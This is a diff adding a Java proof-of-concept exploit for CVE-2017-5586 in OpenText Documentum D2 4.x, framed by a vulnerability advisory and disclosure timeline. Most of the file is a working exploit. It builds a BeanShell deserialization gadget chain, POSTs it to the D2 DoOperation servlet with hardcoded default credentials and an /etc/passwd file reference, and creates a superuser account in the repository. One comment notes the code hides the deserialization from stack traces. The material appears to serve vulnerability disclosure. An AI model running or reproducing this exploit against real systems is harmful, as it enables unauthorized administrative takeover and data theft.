@@ -1,0 +1,147 @@
+/**
+CVE Identifier: CVE-2017-5586
+Vendor: OpenText
+Affected products: Documentum D2 version 4.x
+Researcher: Andrey B. Panfilov
+Severity Rating: CVSS v3 Base Score: 10.0 (AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H)
+Description: Document D2 contains vulnerable BeanShell (bsh) and Apache Commons libraries and accepts serialised data from untrusted sources, which leads to remote code execution
+
+Proof of concept:
+
+===================================8<===========================================
+*/
+
+import java.io.ByteArrayOutputStream;
+import java.io.DataOutputStream;
+import java.io.InputStream;
+import java.io.ObjectOutputStream;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.Field;
+import java.net.HttpURLConnection;
+import java.net.URL;
+import java.util.ArrayList;
+import java.util.Comparator;
+import java.util.List;
+import java.util.PriorityQueue;
+
+import bsh.Interpreter;
+import bsh.XThis;
+
+import com.documentum.fc.client.content.impl.ContentStoreResult;
+import com.documentum.fc.client.impl.typeddata.TypedData;
+
+/**
+* @author Andrey B. Panfilov <andrey (at) panfilov (dot) tel [email concealed]>
+*
+* Code below creates superuser account in underlying Documentum repository
+* usage: java DocumentumD2BeanShellPoc http://host:port/D2 <docbase_name> <user_name_to_create>
+*
+*/
+@SuppressWarnings("unchecked")
+public class DocumentumD2BeanShellPoc {
+
+public static void main(String[] args) throws Exception {
+String url = args[0];
+String docbase = args[1];
+String userName = args[2];
+String payload = "compare(Object foo, Object bar) {new Interpreter()"
++ ".eval(\"try{com.documentum.fc.client.IDfSession session = com.documentum.fc.impl.RuntimeContext.getInstance()"
++ ".getSessionRegistry().getAllSessions().iterator().next();"
++ "session=com.emc.d2.api.D2Session.getAdminSession(session, false);"
++ "com.documentum.fc.client.IDfQuery query = new com.documentum.fc.client.DfQuery("
++ "\\\"CREATE dm_user object set user_name='%s',set user_login_name='%s',set user_source='inline password', "
++ "set user_password='%s', set user_privileges=16\\\");query.execute(session, 3);} "
++ "catch (Exception e) {}; return 0;\");}";
+Interpreter interpreter = new Interpreter();
+interpreter.eval(String.format(payload, userName, userName, userName));
+XThis x = new XThis(interpreter.getNameSpace(), interpreter);
+Comparator comparator = (Comparator) x.getInterface(new Class[] { Comparator.class, });
+PriorityQueue<Object> priorityQueue = new PriorityQueue<Object>(2, comparator);
+Object[] queue = new Object[] { 1, 1 };
+setFieldValue(priorityQueue, "queue", queue);
+setFieldValue(priorityQueue, "size", 2);
+
+// actually we may send priorityQueue directly, but I want to hide
+// deserialization stuff from stacktrace :)
+Class cls = Class.forName("com.documentum.fc.client.impl.typeddata.ValueHolder");
+Constructor ctor = cls.getConstructor();
+ctor.setAccessible(true);
+
+Object valueHolder = ctor.newInstance();
+setFieldValue(valueHolder, "m_value", priorityQueue);
+List valueHolders = new ArrayList();
+valueHolders.add(valueHolder);
+
+TypedData data = new TypedData();
+setFieldValue(data, "m_valueHolders", valueHolders);
+
+ContentStoreResult result = new ContentStoreResult();
+setFieldValue(result, "m_attrs", data);
+
+ByteArrayOutputStream baos = new ByteArrayOutputStream();
+DataOutputStream dos = new DataOutputStream(baos);
+for (Character c : "SAVED".toCharArray()) {
+dos.write(c);
+}
+dos.write((byte) 124);
+dos.flush();
+ObjectOutputStream oos = new ObjectOutputStream(baos);
+oos.writeObject(result);
+oos.flush();
+byte[] bytes = baos.toByteArray();
+baos = new ByteArrayOutputStream();
+dos = new DataOutputStream(baos);
+dos.writeInt(bytes.length);
+dos.write(bytes);
+dos.flush();
+HttpURLConnection conn = (HttpURLConnection) new URL(makeUrl(url)).openConnection();
+conn.setRequestProperty("Content-Type", "application/octet-stream");
+conn.setRequestMethod("POST");
+conn.setUseCaches(false);
+conn.setDoOutput(true);
+conn.getOutputStream().write(baos.toByteArray());
+conn.connect();
+System.out.println("Response code: " + conn.getResponseCode());
+InputStream stream = conn.getInputStream();
+byte[] buff = new byte[1024];
+int count = 0;
+while ((count = stream.read(buff)) != -1) {
+System.out.write(buff, 0, count);
+}
+}
+
+public static String makeUrl(String url) {
+if (!url.endsWith("/")) {
+url += "/";
+}
+return url + "servlet/DoOperation?origD2BocsServletName=Checkin&id=1&file=/etc/passwd
+&file_length=1000"
++ "&_username=dmc_wdk_preferences_owner&_password=webtop";
+}
+
+public static Field getField(final Class<?> clazz, final String fieldName) throws Exception {
+Field field = clazz.getDeclaredField(fieldName);
+if (field == null && clazz.getSuperclass() != null) {
+field = getField(clazz.getSuperclass(), fieldName);
+}
+field.setAccessible(true);
+return field;
+}
+
+public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
+final Field field = getField(obj.getClass(), fieldName);
+field.set(obj, value);
+}
+
+}
+
+/**
+===================================>8===========================================
+
+Disclosure timeline:
+
+2016.02.28: Vulnerability discovered
+2017.01.25: CVE Identifier assigned
+2017.02.01: Vendor contacted, no response
+2017.02.15: Public disclosure
+*/
